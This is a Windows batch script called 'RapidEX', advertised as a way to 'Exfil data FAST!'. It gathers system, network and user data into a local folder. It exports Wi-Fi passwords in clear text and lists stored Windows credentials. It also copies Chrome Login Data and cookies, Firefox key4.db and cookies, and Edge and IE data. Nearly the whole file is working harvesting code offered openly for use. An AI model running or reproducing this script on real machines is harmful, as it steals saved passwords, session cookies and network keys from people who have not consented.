@echo off
title RapidEX SysInfo %COMPUTERNAME%

rem It's not legit if the text isn't green
color 0A
cls

rem                              UNLICENSE
@echo This is free and unencumbered software released into the public domain.
@echo.
@echo Anyone is free to copy, modify, publish, use, compile, sell, or
@echo distribute this software, either in source code form or as a compiled
@echo binary, for any purpose, commercial or non-commercial, and by any
@echo means.
@echo.
@echo In jurisdictions that recognize copyright laws, the author or authors
@echo of this software dedicate any and all copyright interest in the
@echo software to the public domain. We make this dedication for the benefit
@echo of the public at large and to the detriment of our heirs and
@echo successors. We intend this dedication to be an overt act of
@echo relinquishment in perpetuity of all present and future rights to this
@echo software under copyright law.
@echo.
@echo THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
@echo EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
@echo MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
@echo IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
@echo OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
@echo ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
@echo OTHER DEALINGS IN THE SOFTWARE.
@echo.
@echo For more information, please refer to unlicense.org
@echo.
@echo.
@echo.
@echo RRRR     AAA    PPPP   IIIII   DDDD    EEEEE   X   X
@echo R   R   A   A   P   P    I     D   D   E        X X
@echo RRRR    AAAAA   PPPP     I     D   D   EEE       X
@echo R   R   A   A   P        I     D   D   E        X X
@echo R   R   A   A   P      IIIII   DDDD    EEEEE   X   X
@echo.
@echo Exfil data FAST!
@echo.
@echo.
@echo         https://github.com/xsoc/rapidex/
@echo.
@echo.
@echo.

rem Location to store exfil data
SETLOCAL
set RAPIDEX_HOME=%CD%
set EXFIL_HOST=%RAPIDEX_HOME%\%COMPUTERNAME%
set EXFIL_NETWORK=%EXFIL_HOST%\network
set EXFIL_USER=%EXFIL_HOST%\%USERNAME%
set EXFIL_BROWSER=%EXFIL_USER%\browser
set EXFIL_FILES=%EXFIL_HOST%\file_listing

rem Location of browser data
set RAPIDEX_CHROME=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default
set RAPIDEX_FIREFOX=%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles
set RAPIDEX_EDGE="%USERPROFILE%\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe"

@echo Creating directories for exfil in %EXFIL_HOST%
mkdir "%EXFIL_HOST%"                      2> NUL
mkdir "%EXFIL_NETWORK%"                   2> NUL
mkdir "%EXFIL_USER%"                      2> NUL
mkdir "%EXFIL_FILES%"                     2> NUL
mkdir "%EXFIL_BROWSER%"                   2> NUL
mkdir "%EXFIL_BROWSER%\chrome"            2> NUL
mkdir "%EXFIL_BROWSER%\chrome\Bookmarks"  2> NUL
mkdir "%EXFIL_BROWSER%\chrome\Cookies"    2> NUL
mkdir "%EXFIL_BROWSER%\chrome\History"    2> NUL
mkdir "%EXFIL_BROWSER%\chrome\Login Data" 2> NUL
mkdir "%EXFIL_BROWSER%\chrome\Web Data"   2> NUL
mkdir "%EXFIL_BROWSER%\firefox"           2> NUL
mkdir "%EXFIL_BROWSER%\edge"              2> NUL
mkdir "%EXFIL_BROWSER%\ie\cookies"        2> NUL
mkdir "%EXFIL_BROWSER%\ie\favorites"      2> NUL

cd "%EXFIL_HOST%"

rem system info and gpresult are slow so start them in a new processes for multi-threaded goodness
start /b systeminfo > "%EXFIL_HOST%\systeminfo.txt"
start /b GPRESULT /R > "%EXFIL_HOST%\grouppolicy.txt"

@echo Networking...
netsh wlan export profile folder="%EXFIL_NETWORK%" key=clear > NUL
netsh wlan show profiles > "%EXFIL_NETWORK%\wlan_profiles.txt"
ipconfig          > "%EXFIL_NETWORK%\ipconfig.txt"
arp -a            > "%EXFIL_NETWORK%\arp.txt"
netstat -anq      > "%EXFIL_NETWORK%\netstat.txt"
REM netstat -aq       > "%EXFIL_NETWORK%\netstat_dns.txt"
net share         > "%EXFIL_NETWORK%\net_share.txt"
net use           > "%EXFIL_NETWORK%\net_use.txt"
net user          > "%EXFIL_NETWORK%\net_user.txt"

@echo EnvVars...
set               > "%EXFIL_HOST%\env.txt"

@echo Users...
rem Crude but effective?
dir /B C:\Users\  > "%EXFIL_HOST%\users.txt"

@echo Credentials...
cmdkey /list      > "%EXFIL_HOST%\credentials.txt"

@echo Scheduled tasks...
schtasks          > "%EXFIL_HOST%\schtasks.txt"

@echo Storeage devices...
wmic logicaldisk get deviceid, volumename, description > "%EXFIL_HOST%\drives.txt"
subst             > "%EXFIL_HOST%\subst.txt"

@echo Process Listing...
tasklist          > "%EXFIL_HOST%\tasklist.txt"
sc query          > "%EXFIL_HOST%\sc_query.txt"

@echo Driver Listing...
driverquery       > "%EXFIL_HOST%\driverquery.txt"
mode              > "%EXFIL_HOST%\mode.txt"

@echo File Associations...
ftype             > "%EXFIL_HOST%\ftype.txt"
assoc             > "%EXFIL_HOST%\assoc.txt"

@echo Listing Installed Programs...
rem dir /B /S "%ProgramFiles(x86)%" > "%EXFIL_FILES%\ProgramFiles(x86).txt"
rem dir /B /S "%ProgramFiles%" > "%EXFIL_FILES%\ProgramFiles.txt"
dir /B "%ProgramFiles(x86)%" > "%EXFIL_FILES%\ProgramFiles(x86).txt"
dir /B "%ProgramFiles%" > "%EXFIL_FILES%\ProgramFiles.txt"

@echo Browser User Profiles...
if EXIST "%RAPIDEX_CHROME%" (
    @echo Grabbing Chrome [Smart]

    xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_CHROME%\Bookmarks"  "%EXFIL_BROWSER%\chrome\Bookmarks\"
    xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_CHROME%\Cookies"    "%EXFIL_BROWSER%\chrome\Cookies\"
    xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_CHROME%\History"    "%EXFIL_BROWSER%\chrome\History\"
    xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_CHROME%\Login Data" "%EXFIL_BROWSER%\chrome\Login Data\"
    xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_CHROME%\Web Data"   "%EXFIL_BROWSER%\chrome\Web Data\"
    
    dir /B "%RAPIDEX_CHROME%\Extensions" > "%EXFIL_BROWSER%\chrome\DIR_Extensions.txt"
)

rem Firefox is kind of a pain with it's random profile folder names
rem Iterate through all of them
if EXIST "%RAPIDEX_FIREFOX%" (
    @echo Grab Firefox [Smart]

    for /D %%I in (%RAPIDEX_FIREFOX%\*) do mkdir "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\cookies.sqlite"          "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\cookies.sqlite-shm"      "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\cookies.sqlite-wal"      "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\formhistory.sqlite"      "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\key4.db"                 "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\places.sqlite"           "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\places.sqlite-shm"       "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\places.sqlite-wal"       "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\webappsstore.sqlite"     "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\webappsstore.sqlite-shm" "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
    for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\webappsstore.sqlite-wal" "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
)

rem Modern Edge and IE hide cookies somewhere else, but we'll try anyway...
if EXIST "%RAPIDEX_EDGE%" (
    @echo Grab Edge [Dumb]
    xcopy /E /C /G /H /Y /Q "%RAPIDEX_EDGE%" "%EXFIL_BROWSER%\edge"
)

@echo Grab IE [Dumb]
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\Local\Microsoft\Windows\INetCookies" "%EXFIL_BROWSER%\ie\cookies"
xcopy /E /C /G /H /Y /Q "%USERPROFILE%\Favorites"                           "%EXFIL_BROWSER%\ie\favorites"

REM @echo Full directory listing...
rem Dir is more readable but *MUCH* larger
REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & dir /B /S %%x > "%EXFIL_FILES%\Full_Dir_Listing.txt"

rem Tree is less readable
REM for /f "skip=1" %%x in ('wmic logicaldisk get caption') do %%x & cd \ & tree /A /F %%x > "%EXFIL_FILES%\Full_Dir_Listing.txt"

rem Tidy up...
rem Change window title to path to cmd.exe (default)
title %comspec%
color
ENDLOCAL
goto :EOF
